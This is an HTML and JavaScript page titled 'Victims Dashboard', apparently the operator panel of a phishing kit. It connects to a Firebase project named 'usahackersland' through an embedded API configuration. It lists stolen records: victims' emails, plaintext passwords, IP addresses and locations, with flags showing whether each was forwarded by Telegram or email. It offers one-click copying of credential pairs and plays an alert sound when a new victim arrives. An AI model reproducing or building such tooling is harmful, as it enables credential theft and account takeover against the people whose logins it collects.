<!DOCTYPE html>
<html>
<head>
    <title>📋 Victims Dashboard</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js"></script>
    <style>
        body { font-family: Arial, sans-serif; background: #f2f2f2; padding: 20px; }
        h2 { text-align: center; }
        .card { background: white; padding: 15px; margin: 15px auto; border-radius: 10px; box-shadow: 0 0 5px rgba(0,0,0,0.1); max-width: 600px; position: relative; }
        .flag-emoji { font-size: 24px; vertical-align: middle; }
        button.copy-btn, button.delete-btn {
            position: absolute;
            top: 15px;
            padding: 5px 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            color: white;
            font-weight: bold;
            font-size: 12px;
        }
        button.copy-btn { right: 60px; background-color: #4CAF50; }
        button.delete-btn { right: 15px; background-color: #f44336; }
        .status-true { color: green; font-weight: bold; }
        .status-false { color: red; font-weight: bold; }
    </style>
</head>
<body>
    <h2>📋 Victims Dashboard</h2>
    <div id="victimsList"></div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
            authDomain: "usahackersland.firebaseapp.com",
            projectId: "usahackersland",
            storageBucket: "usahackersland.appspot.com",
            messagingSenderId: "588407428267",
            appId: "1:588407428267:web:7c4898cbb62efd3d5953ee"
        };
        firebase.initializeApp(firebaseConfig);
        const firestore = firebase.firestore();

        let lastSnapshotIds = new Set();

        function copyText(text) {
            navigator.clipboard.writeText(text)
                .then(() => alert('Copied to clipboard!'))
                .catch(() => alert('Failed to copy.'));
        }

        function countryCodeToEmoji(code) {
            if (!code) return '';
            return code.toUpperCase().replace(/./g, char =>
                String.fromCodePoint(127397 + char.charCodeAt())
            );
        }

        function renderVictims(docs) {
            let output = "";
            docs.forEach(doc => {
                let v = doc.data();
                const id = doc.id;
                const flagEmoji = v.flag || (v.countryCode ? countryCodeToEmoji(v.countryCode) : '');

                output += `
                    <div class="card" data-id="${id}">
                        <button class="copy-btn">📋 Copy</button>
                        <button class="delete-btn">🗑️ Delete</button>

                        📧 <b>Email:</b> ${v.Username || v.email || ''} <br>
                        🔑 <b>Password:</b> ${v.Password || v.password || ''} <br>
                        🌐 <b>IP:</b> ${v.ip || ''} <br>
                        📍 <b>Location:</b> ${v.country || ''} <span class="flag-emoji">${flagEmoji}</span> <br>
                        🕒 <b>Time:</b> ${v.timestamp || v.time || ''} <br>
                        📲 <b>Telegram:</b> <span class="${v.telegramSent ? 'status-true' : 'status-false'}">${v.telegramSent ? '✅' : '❌'}</span> <br>
                        📧 <b>Email Sent:</b> <span class="${v.emailSent ? 'status-true' : 'status-false'}">${v.emailSent ? '✅' : '❌'}</span> <br><br>

                        <hr>
                        <b>Other Details:</b><br>
                        ${Object.entries(v)
                            .filter(([k]) => !['Username','email','Password','password','ip','country','flag','timestamp','time','countryCode','telegramSent','emailSent'].includes(k))
                            .map(([key,value]) => `<b>${key}:</b> ${value}<br>`).join('')}
                    </div>
                `;
            });
            document.getElementById('victimsList').innerHTML = output;

            // Attach copy & delete handlers
            document.querySelectorAll('.card').forEach(card => {
                const id = card.getAttribute('data-id');
                const victimData = docs.find(d => d.id === id).data();

                card.querySelector('.copy-btn').onclick = () => {
                    const textToCopy = `Email: ${victimData.Username || victimData.email || ''}\nPassword: ${victimData.Password || victimData.password || ''}`;
                    copyText(textToCopy);
                };

                card.querySelector('.delete-btn').onclick = () => {
                    if (confirm('Delete this entry?')) {
                        firestore.collectionGroup('victims').doc(id).delete()
                            .then(() => alert('Entry deleted'))
                            .catch(err => alert('Delete failed: ' + err.message));
                    }
                };
            });
        }

        firestore.collectionGroup('victims').orderBy('timestamp', 'desc').onSnapshot(snapshot => {
            const docs = snapshot.docs;

            // Detect new victims
            docs.forEach(doc => {
                if (!lastSnapshotIds.has(doc.id)) {
                    if (lastSnapshotIds.size > 0) { // skip initial load
                        const audio = new Audio("https://actions.google.com/sounds/v1/cartoon/wood_plank_flicks.ogg");
                        audio.play();
                    }
                }
            });

            lastSnapshotIds = new Set(docs.map(doc => doc.id));
            renderVictims(docs);
        });
    </script>
</body>
</html>
